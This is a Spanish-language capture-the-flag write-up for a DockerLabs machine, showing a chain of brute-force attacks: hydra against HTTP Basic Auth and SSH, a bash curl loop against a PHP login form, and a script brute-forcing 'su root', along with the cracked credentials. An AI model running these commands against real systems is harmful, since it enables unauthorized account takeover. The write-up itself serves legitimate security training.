---
title: "DockerLabs - InfluencerHate"
difficulty: "Fácil"
source: "DockerLabs"
---

Máquina orientada a practicar múltiples capas de fuerza bruta: HTTP Basic Auth sobre Apache, formulario de login web PHP, acceso SSH y escalada de privilegios mediante bruteforce a `su root`.

## Despliegue

```bash
bash auto_deploy.sh influencerhate.tar
```

## Reconocimiento

```bash
nmap -sCV -p- 172.17.0.2
```

**Resultados:**
- `22/tcp` — SSH
- `80/tcp` — Apache httpd 2.4.62 (Debian) con HTTP Basic Auth (`401 Unauthorized`, realm: "Zona restringida")

## Explotación

### 1. Fuerza bruta HTTP Basic Auth

```bash
hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 172.17.0.2 http-get / -t 64
```

**Credenciales:** `httpadmin:fhttpadmin`

### 2. Enumeración web

```bash
gobuster dir -u http://httpadmin:fhttpadmin@172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -t 50 -x php,html,txt,bak,old
```

Resultado relevante: `/login.php` — formulario de login con campos `username` / `password`.

### 3. Fuerza bruta formulario login (login.php)

Mensaje de error en fallo: `Credenciales incorrectas`.

Hydra tiene problemas de parsing con el header Basic Auth en `http-post-form`. Alternativa con script bash:

```bash
#!/bin/bash
URL="http://172.17.0.2/login.php"
USER="admin"
WORDLIST="/usr/share/wordlists/rockyou.txt"
BASIC_AUTH="Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4="

while read PASS; do
    RESPONSE=$(curl -s -H "$BASIC_AUTH" -X POST "$URL" -d "username=$USER&password=$PASS")
    if [[ ! "$RESPONSE" =~ "Credenciales incorrectas" ]]; then
        echo "[+] PASSWORD ENCONTRADA: $PASS"
        break
    fi
done < "$WORDLIST"
```

**Credenciales:** `admin:chocolate`

El panel web tras el login revela el usuario del sistema: `balutin`.

### 4. Acceso SSH

```bash
hydra -l balutin -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 50 -f
```

**Credenciales:** `balutin:estrella`

```bash
ssh balutin@172.17.0.2
```

## Escalada de privilegios

SUID y sudo sin vectores aprovechables. Se encuentra hash Apache MD5 en `/home/.htpasswd` (usuario `httpadmin`, no existe como usuario del sistema).

Bruteforce directo a `su root` con [suBruteforce](https://github.com/D1se0/suBruteforce):

```bash
# En la máquina atacante
scp suBruteforce.sh rockyou.txt balutin@172.17.0.2:/tmp/

# En la máquina víctima
chmod +x /tmp/suBruteforce.sh
/tmp/suBruteforce.sh root /tmp/rockyou.txt
```

**Credenciales root:** `root:rockyou`

```bash
su root
whoami
# root
```

## Conclusión

El laboratorio se basa por completo en fuerza bruta encadenada: HTTP Basic Auth sobre Apache, el formulario de `login.php`, el acceso SSH del usuario `balutin` y, finalmente, un bruteforce directo a `su root` cuando no se encontró ningún vector clásico de escalada de privilegios.
